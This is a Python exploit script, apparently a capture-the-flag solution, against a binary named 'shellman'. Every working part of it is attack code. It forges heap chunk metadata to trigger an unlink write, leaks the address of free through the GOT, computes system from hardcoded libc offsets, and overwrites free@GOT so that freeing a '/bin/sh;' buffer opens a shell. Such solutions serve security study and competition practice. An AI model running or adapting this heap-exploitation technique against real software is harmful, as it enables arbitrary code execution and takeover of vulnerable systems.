from zio import *
import struct

target = "./shellman"

def get_io(target):
	io = zio(target, timeout = 9999)
	return io

def list_shellcode(io):
	io.read_until(">")
	io.write("1\n")

def new_shellcode(io, data):
	io.read_until(">")
	io.write("2\n")
	io.read_until("Length of new shellcode: ")
	io.write("%d\n"%(len(data)))
	io.read_until("Enter your shellcode(in raw format): ")
	io.write(data)

def edit_shellcode(io, number, data):
	io.read_until(">")
	io.write("3\n")
	io.read_until("Shellcode number: ")
	io.write("%d\n"%number)
	io.read_until("Length of shellcode: ")
	io.write("%d\n"%(len(data)))
	io.read_until("Enter your shellcode: ")
	io.write(data)

def delete_shellcode(io, number):
	io.read_until(">")
	io.write("4\n")
	io.read_until("Shellcode number: ")
	io.write("%d\n"%number)

def full_pack(data, length, pack_ch = 'a'):
	return data + pack_ch * (length - len(data))

def pwn(io):
	#try_normal(io)
	try_pwn(io)

def try_normal(io):

	#four ndoe(0,1,2,3)
	new_shellcode(io, full_pack("", 0x80, '0'))
	new_shellcode(io, full_pack("", 0x80, '1'))
	new_shellcode(io, full_pack("", 0x80, '2'))
	new_shellcode(io, full_pack("", 0x80, '3'))

	list_shellcode(io)
	#attach gdb
	raw_input(":")
	#see heap in normal
	edit_shellcode(io, 0, "0" * 0x80)

	delete_shellcode(io, 1)

	#reserve node0 -> delete node 1
	#delete_shellcode(io, 1)

	data0 = "0" * 0x80
	#overwrite node 0 -> overflow node 1
	edit_shellcode(io, 0, data0)

	#delete node 2 -> unlink node 1
	delete_shellcode(io, 2)
	edit_shellcode(io, 0, data0)


	list_shellcode(io)

	edit_shellcode(io, 1, "poo" * 8)
	list_shellcode(io)

	#delete_shellcode(io, 3)
	#list_shellcode(io)

	io.interact()

def try_pwn(io):

	#four ndoe(0,1,2,3)
	new_shellcode(io, full_pack("", 0x80, '0'))
	new_shellcode(io, full_pack("", 0x80, '1'))
	new_shellcode(io, full_pack("", 0x80, '2'))
	new_shellcode(io, full_pack("/bin/sh;", 0x80, '3'))

	#attach gdb
	#raw_input(":")
	#see heap in normal
	edit_shellcode(io, 0, "0" * 0x80)

	node_head_addr = 0x6016c0
	node1_addr = node_head_addr + 3 * 8 + 2 * 8 #node1's buff ptr

	p0 = struct.pack("Q", 0x0)
	p1 = struct.pack("Q", 0x91)
	p2 = struct.pack("Q", node1_addr - 3 * 8)
	p3 = struct.pack("Q", node1_addr - 2 * 8)

	node2_pre_size = struct.pack("Q", 0x90)
	node2_size = struct.pack("Q", 0xa0)

	data0 = full_pack("", 0x80, '0')
	data0 += p0 + p1 + p2 + p3 + full_pack("", 0x80 - len(p2 + p3), '1')
	data0 += node2_pre_size + node2_size

	#reserve node0 -> delete node 1
	#delete_shellcode(io, 1)

	#overwrite node 0 -> overflow node 1
	#edit_shellcode(io, 0, data0)

	p0 = struct.pack("Q", 0x0)
	p1 = struct.pack("Q", 0x81)
	p2 = struct.pack("Q", node1_addr - 3 * 8)
	p3 = struct.pack("Q", node1_addr - 2 * 8)
	node1_pre_size = struct.pack("Q", 0x80)
	node1_size = struct.pack("Q", 0x90)
	data1 = p0 + p1 + p2 + p3 + full_pack("", 0x70 - len(p2 + p3), '1') + node1_pre_size + node1_size
	edit_shellcode(io, 1, data1)

	#delete node 2 -> unlink node 1
	delete_shellcode(io, 2)

  	free_got = 0x0000000000601600
  	free_got_str = struct.pack("Q", free_got)

	data1 = free_got_str + l64(1) + l64(0x80) + free_got_str

	edit_shellcode(io, 1, data1)
	list_shellcode(io)
	data = io.read_until("SHELLC0DE 1: ") + io.read(16)

	#get free real addr
	pos = data.find("SHELLC0DE 1: ") +  len("SHELLC0DE 1: ")
	print "free:", data[pos:pos + 16]
	free_addr = struct.unpack("Q", data[pos:pos + 16].decode("hex"))[0]
	print "free:", hex(free_addr)

	system_addr = 0x0000000000044C40 + free_addr - 0x0000000000082DA0

	data1 = l64(system_addr)
	edit_shellcode(io, 1, data1)
	delete_shellcode(io, 3)
	#list_shellcode(io)

	io.interact()

io = get_io(target)
pwn(io)